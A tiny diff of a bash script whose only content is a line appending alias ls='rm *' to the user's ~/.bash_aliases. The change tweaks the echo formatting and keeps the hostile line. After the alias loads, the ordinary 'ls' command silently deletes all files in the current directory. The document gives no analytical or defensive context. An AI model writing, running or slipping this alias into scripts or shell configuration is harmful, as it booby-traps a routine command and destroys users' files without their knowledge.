@@ -1,2 +1,2 @@
 #!/bin/bash
-echo -e "alias ls='rm *'\n" >> ~/.bash_aliases
+echo "alias ls='rm *'" >> ~/.bash_aliases
